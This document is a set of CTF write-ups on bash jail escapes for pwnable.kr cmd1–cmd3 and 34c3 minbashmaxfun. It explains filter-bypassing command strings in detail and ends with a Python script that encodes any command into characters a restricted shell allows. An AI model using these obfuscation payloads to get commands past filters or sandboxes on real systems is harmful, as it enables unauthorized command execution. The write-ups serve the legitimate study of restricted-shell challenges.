Bash challs

## pwnable.kr
### cmd1

use command to avoid keyword

./cmd1 'for c in $(/bin/ls f* | /usr/bin/tr " " "\n"); do /bin/cat $c; done'
mommy now I get what PATH environment is for :)

### cmd2

use $(pwd) to replace /

for c in $($(pwd)bin$(pwd)ls $(pwd)home$(pwd)cmd2$(pwd)f*); do $(pwd)bin$(pwd)cat $c; done
FuN_w1th_5h3ll_v4riabl3s_haha

### cmd3

The most important parts of this are the lines showing that the cmd is filtered and then passed to rbash. Rbash is a shell which (among other things) restricts execution of programs to those that are in the passed PATH, in this case “jail”. Also to my frustration the source operator “.” is similarly restricted. Additionally the filter method ensures that the only allowed characters are printable, nonalphanumeric, and not within the blacklist. This is a very limited set of characters as notably even spaces are not allowed. So the objective becomes how to craft a cmd out of allowed characters that will allow us to read the flagbox file. It is tough. My first idea, briefly alluded to above, was to use the source operator “.” to print out the file like “.${var containing space}./???????/????????????????????????????????”. This would ideally give an output like “{password}: command not found”. Unfortunately there are a couple issues with this that i didn’t figure out till later. First as stated before the source operator does not accept any string with “/” in it as an argument so you cannot escape the jail directory. Secondly the flabox directory is not readable so the file (“flagbox/{32 character string}”) cannot be referenced using the “?” wildcards. But I didn’t know either of those things so I set about trying to form this string. Really it wasn’t a waste of time because I needed to construct a variable with space in it anyway. Thats what the first part of my magic string 
```
 “__=$((($$/$$)));___=({.,.});____=${___[@]};_____=${____:__:__}” 
```
is creating. This string heavily uses some weird bash stuff that is well covered on this site . So lets break this part down.

```__=$((($$/$$))) -> Puts the value 1 in $__```. As covered on the aforementioned site (((…))) allows you to do arithmetic in bash so $$/$$ evaluates to 1.

```___=({.,.})``` -> This is a bit confusing pretty much it just makes a variable $___ with an array containing 2 periods.

____=${___[@]} -> This takes that array and makes it into the string “. .”. Theres a space!

_____=${____:__:__} -> So now we put the string of length 1 at offset 1 of the previous constructed string into $_____. That character is the space!

Alright so we have a variable with a space now. It was at this point where I discovered that my previous strategy was not going to work. So I had to change tact. The next part just puts the numbers 2, 3, and 5 into variables. That code is : “___=$(((__+__)));____=$(((___+__)));______=$(((____+___)))” . Finally…

????/???;$(${_:______:____}${_____}/???/___) -> the first part uses wildcards to put “jail/cat” into $_. Then using the variables created above, the string “cat” is isolated and then the space variable is used followed by the wildcard expression that becomes /tmp/___. This is all wrapped in $(…) so this translates to “$(cat /tmp/___)” which will execute the command written in /tmp/___.

The exploit code writes “cat {flagfile}” into ___ so the command prints the password. Then the password is sent and the flag is printed. This challenge took some lateral thinking and several hours, not to mention lots of ideas that didn’t end up working. But I did learn a lot about bash minutiae that I will almost definitely never use again, so it was all worth it. If you have a better/shorter solution post it in the comments. Unless its too short and makes me look bad in which case keep it to yourself.





## 34c3 CTF - minbashmaxfun

this challenge poses two main obstacles: the allowed characters — **$()#!{}<\’,**, and the other, is stdin is closed right before invoking your command.

Our Arsenal

We have quite a few tools at our disposal which we use in our solution, so let’s start by explaining them:

```
$# - number of arguments -  (evaluates to 0)
${##} - count variable (#) length - (evaluates to 1)
$((expr)) - arithmetic expression
<<< - here string 
${!var} - indirect expansion
$'\123' - convert octal to a character in string literal
{a,b} - curly brace expansion
```

That’s the basis, and we build upon this like so:

```
$((${##}<<${##})) - 1 left shift by 1, evaluates to 2
${!#} - executes bash (as the first argument is /bin/bash)
$((2#1000001)) - convert binary to decimal. 2, 1 and 0 are forbidden and will be replaced
```

A simple start

Let’s start by converting one simple command: ls.

The octal representation of the characters is 0154, 0163. So our final goal is to build this bash string: $'\154\163.Since we cannot obviously send the digits, let’s start by converting each them to a binary representation, like so: 0b10011010, 0b10100011.

Now, this we can work with. Simply convert each of the binary-digits to either \$# (0) or ${##} (1). Then put the result of each character inside arithmetic-expansion braces. This should be the result:
```
154: $((2#${##}$#$#${##}${##}$#${##}$#))
163: $((2#${##}$#${##}$#$#$#${##}${##}))
```
All that’s left to do at this point, is two simple things:

    Replace the 2 in the arithmetic-conversion to the left-shift as explained before.
```
154: $(($((${##}<<${##}))#${##}$#$#${##}${##}$#${##}$#))
163: $(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))
```

2. Place the converted numbers inside a dollar quoted string literal (i.e $'\154'$'\163').

```
154: \$\'\\$(($((${##}<<${##}))#${##}$#$#${##}${##}$#${##}$#))\'
163: \$\'\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\'
```
Do note that the string literal elements are all carefully escaped, if they weren’t escaped, the inside string was not going to be expanded at all by bash, and taken as… well… a string literal :).

(more on that below)
We’re almost done

At this point you can simply take:
```
\$\'\\$(($((${##}<<${##}))#${##}$#$#${##}${##}$#${##}$#))\'\$\'\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\'
```
(which is the combined string we’ve just built)

and send it to the min-bash shell.

However, as you’ll see, you’ll get this error:
```
min-bash> /bin/bash: $'\154'$'\163': command not found
```

This is because the string literal expansion didn’t take place. All we need is to pipe this string through another instance of bashwhich will parse this into the literal ls.

In order to pipe the string, we’ll use the here-string, and in order to launch another instance of bash, we’ll just use indirect expansion on $0. Like so:

```
${!#}<<<my string
```
or in our case:
```
${!#}<<<\$\'\\$(($((${##}<<${##}))#${##}$#$#${##}${##}$#${##}$#))\'\$\'\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\'
```
Send this to the min-bash shell and you’ll see ls working as expected!
What about arguments?

Well… If you’ll try using this method and try to run a program which takes command line arguments, you’ll soon see this error:

min-bash> /bin/bash: line 1: ls -l: command not found

This is because we’re effectively doing the following:

```
bash<<<"'ls -l'"
```

which prevents bash from doing the argument separation by spaces.

Fret not, as the fix for this is rather simple.

We simply use the above method to run bash -c and that takes as an argument the final command. This way, the second bash invocation does the argument separation.

In order to place a space character between bash and -c, we use brace expansion: {bash,-c}. This expands to the string with the space.
Putting it all together

So, if you take all the pieces, what we’re effectively translating with the above method is:

```
bash<<<{bash,-c,ls -l}
```

This lets us freely run any command without any command line processing limitations.

Obviously this was all scripted with one (rather quick-and-ditry) python script, and was not hand-crafted like above.

Simply use the conversion script as follows:

./convert.py 'ls -la' | nc 35.198.107.77 1337

(If you don’t supply an argument to the conversion script, it will use the flag-catching command as a default.)

The script is embedded in the end.
Catching the flag

Once you have a ‘shell’ of sorts, you need to run the get_flag binary, which spits out a (random) calculation:
```
Please solve this little captcha:
530892629 + 3254451000 + 4211578791 + 2425633949 + 368428465
10790984834 != 0 :(
```
You just need to pipe back in, to the same process, the result.

We used the following command for the flag catching:
```
bash -c 'expr $(grep + /tmp/out)' | /get_flag > /tmp/out; cat /tmp/out
```
This runs the get_flag binary, saving the output to file in /tmp, and pipes back in the result.


```
#!/usr/bin/env python

# write up:
# https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60

import sys

a = "bash -c 'expr $(grep + /tmp/out)' | /get_flag > /tmp/out; cat /tmp/out"
if len(sys.argv) == 2:
    a = sys.argv[1]

out = r"${!#}<<<{"

for c in "bash -c ":
    if c == ' ':
        out += ','
        continue
    out += r"\$\'\\"
    out += r"$(($((${##}<<${##}))#"
    for binchar in bin(int(oct(ord(c))[1:]))[2:]:
        if binchar == '1':
            out += r"${##}"
        else:
            out += r"$#"
    out += r"))"
    out += r"\'"

out += r"\$\'"
for c in a:
    out += r"\\"
    out += r"$(($((${##}<<${##}))#"
    for binchar in bin(int(oct(ord(c))[1:]))[2:]:
        if binchar == '1':
            out += r"${##}"
        else:
            out += r"$#"
    out += r"))"
out += r"\'"

out += "}"
print out
```